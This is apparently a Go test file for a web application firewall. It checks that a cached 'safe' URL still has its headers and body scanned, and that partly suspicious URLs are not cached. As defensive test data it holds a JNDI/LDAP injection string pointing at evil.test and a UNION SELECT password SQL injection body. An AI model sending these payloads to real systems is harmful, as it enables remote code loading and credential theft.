package main

import (
	"net/http/httptest"
	"strings"
	"testing"

	"secure-proxy-waf/internal/engine"
)

// The safe-URL cache vouches for a URL. It used to vouch for the whole
// request: a hit returned 204 before anything else ran, so once a clean GET had
// been seen, the same URL with a payload in an inspected header or in a body
// was never scanned, never reached the heuristics and never reached the
// traffic log. These pin that a hit skips only what depends on the URL.

func cacheHits() int64 {
	return eng.SafeCache().Stats()["cache_hits"]
}

func warmCache(t *testing.T, u, clientIP string) {
	t.Helper()
	if v := runReqmod(t, httptest.NewRequest("GET", u, nil), clientIP); v.Action != "allow" {
		t.Fatalf("warm-up GET was not allowed: %s", v)
	}
}

func TestSafeCacheHitStillInspectsHeaders(t *testing.T) {
	withEngine(t, engine.Config{BlockThreshold: 10})
	const u = "http://example.com/cached-header-probe"
	warmCache(t, u, "198.51.100.60")

	r := httptest.NewRequest("GET", u, nil)
	r.Header.Set("User-Agent", "${jndi:ldap://evil.test/a}")
	v := runReqmod(t, r, "198.51.100.61")
	if v.HTTPStatus != 403 || v.Rules != "L4S-001" {
		t.Errorf("a header payload on a cached URL was not blocked: %s", v)
	}
}

func TestSafeCacheHitStillInspectsBody(t *testing.T) {
	withEngine(t, engine.Config{BlockThreshold: 10})
	const u = "http://example.com/cached-body-probe"
	warmCache(t, u, "198.51.100.62")

	r := httptest.NewRequest("GET", u, strings.NewReader("user=x&q=UNION SELECT password FROM users"))
	r.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	v := runReqmod(t, r, "198.51.100.63")
	if v.HTTPStatus != 403 || !strings.Contains(v.Rules, "SQLi-001") {
		t.Errorf("a body payload on a cached URL was not blocked: %s", v)
	}
}

func TestSafeCacheHitStillReachesHeuristicsAndTheTrafficLog(t *testing.T) {
	withEngine(t, engine.Config{BlockThreshold: 10})
	const u = "http://example.com/cached-log-probe"
	warmCache(t, u, "198.51.100.64")

	before := cacheHits()
	v := runReqmod(t, httptest.NewRequest("GET", u, nil), "198.51.100.64")
	if cacheHits() != before+1 {
		t.Fatalf("the repeat GET did not hit the safe cache (hits %d -> %d)", before, cacheHits())
	}
	if !v.FeatureFound {
		t.Error("a cache hit produced no traffic feature: heuristics and the log never saw it")
	}
	if v.ICAPCode != 204 {
		t.Errorf("a clean cached GET returned %d, want 204", v.ICAPCode)
	}
}

// A URL that scored below the threshold is not clean, it is unproven: its
// partial score must still be there to corroborate a later header or
// heuristic signal, so it must not be cached.
func TestSafeCacheHoldsOnlyURLsThatScoredZero(t *testing.T) {
	withEngine(t, engine.Config{BlockThreshold: 10})
	const u = "http://example.com/faq-cache?q=is+%27true%27+%3D+%27true%27+in+python" // SQLi-015, score 4

	first := runReqmod(t, httptest.NewRequest("GET", u, nil), "198.51.100.65")
	if first.Score != 4 {
		t.Fatalf("fixture drifted: want score 4, got %s", first)
	}
	before := cacheHits()
	second := runReqmod(t, httptest.NewRequest("GET", u, nil), "198.51.100.65")
	if cacheHits() != before {
		t.Error("a URL that scored 4 was cached as safe")
	}
	if second.Score != 4 {
		t.Errorf("the repeat request lost the URL's score: %s", second)
	}
}
